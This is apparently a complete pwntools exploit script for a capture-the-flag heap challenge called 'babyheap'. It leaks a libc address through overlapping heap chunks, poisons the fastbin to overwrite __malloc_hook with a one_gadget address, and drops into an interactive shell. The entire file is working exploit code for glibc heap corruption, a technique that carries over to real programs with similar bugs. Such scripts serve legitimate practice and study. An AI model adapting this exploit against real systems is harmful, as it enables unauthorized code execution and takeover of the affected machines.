#!/usr/bin python
from pwn import *

debug = 1
gdb_debug = 1

if debug:
	p = process('./babyheap') #you can specify libc with env:{'LD_PRELOAD': 'libc.so'}
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	pass

def allocate(size):
	p.recvuntil("Command: ")
	p.sendline('1')
	p.recvuntil("Size: ")
	p.sendline(str(size))

def fill(index, content):
	p.recvuntil("Command: ")
	p.sendline('2')
	p.recvuntil("Index: ")
	p.sendline(str(index))
	p.recvuntil("Size: ")
	p.sendline(str(len(content)))
	p.recvuntil("Content: ")
	p.send(content)

def free(index):
	p.recvuntil("Command: ")
	p.sendline('3')
	p.recvuntil("Index: ")
	p.sendline(str(index))

def dump(index):
	p.recvuntil("Command: ")
	p.sendline('4')
	p.recvuntil("Index: ")
	p.sendline(str(index))
	#return p.recv(size)
	p.recvuntil("Content: \n")

#leaking libc is not the same as before because of using calloc which will empty the memory.
allocate(0x20) #0
allocate(0x20) #1
allocate(0x20) #2
allocate(0x20) #3

allocate(0x80) #4

free(1)
free(2)
payload  = p64(0)*5
payload += p64(0x31)
payload += p64(0)*5
payload += p64(0x31)
payload += p8(0xc0)
fill(0, payload)

payload  = p64(0)*5
payload += p64(0x31)
fill(3, payload)

allocate(0x20) #1
allocate(0x20) #2

payload  = p64(0)*5
payload += p64(0x91)
fill(3, payload)

allocate(0x80) #in case of consolidation #5
free(4)

dump(2)

libc_addr = u64(p.recv(8)) - 0x3C1760 - 0x58
print "libc_addr: " + hex(libc_addr) 

malloc_hook = libc_addr + 0x3C1740
print "malloc_hook: " + hex(malloc_hook)
one_gadget = libc_addr + 0x4647c
print "one_gadget: " + hex(one_gadget)
target = malloc_hook + 0xd - 0x20
print "target: " + hex(target)

allocate(0x60)  #4 get from unsorted bin
free(4)

fill(2, p64(target)) 

allocate(0x60) #4
allocate(0x60) #6

payload  = '\x00'*3
payload += p64(one_gadget)
fill(6, payload)
#gdb.attach(p)
allocate(255)

p.interactive()



